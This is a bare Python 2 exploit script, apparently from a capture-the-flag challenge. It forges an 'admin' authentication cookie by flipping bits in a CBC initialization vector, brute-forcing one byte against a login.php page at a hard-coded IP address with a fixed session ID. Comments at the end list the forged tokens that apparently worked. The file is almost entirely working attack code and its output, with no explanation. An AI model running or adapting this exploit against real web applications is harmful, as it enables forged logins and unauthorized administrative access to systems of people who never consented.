#-*- coding:utf-8 -*-
import requests
import base64

def xor(mid, m):
    tmp = ''
    for a, b in zip(mid, m):
        tmp += chr(ord(a) ^ ord(b))
    return tmp

mid = "3317264c163a0c4f041a2d70553e67"
ssid = "i0qpe0vpvlntssmvgv8n4os5t5"
token = "bnp6RThhYnp6Q2hjQjF5Zg=="
a = "0123456789abcdef"

m = "admin".encode('hex') + '0b' * 11

url = "http://111.231.111.54/login.php"
for i in a:
    for k in a:
        new_mid = str(i) + str(k) + mid
        iv = xor(new_mid.decode('hex'), m.decode('hex'))
        cookie = {"PHPSESSID":ssid, "token":base64.b64encode(iv).replace('=', '%3D')}
        res = requests.get(url, cookies=cookie)
        #print res.content
        if "Error!" not in res.content:
            print mid, ssid, base64.b64encode(iv).replace('=', '%3D')
            break

# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 YVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 cVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 QVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 UVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 IVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 MVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 AVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 EVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 4Vd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 8Vd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 wVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 0Vd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 oVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 sVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 gVd6TyIdMQdEDxEme141bA%3D%3D
# 3317264c163a0c4f041a2d70553e67 i0qpe0vpvlntssmvgv8n4os5t5 kVd6TyIdMQdEDxEme141bA%3D%3D

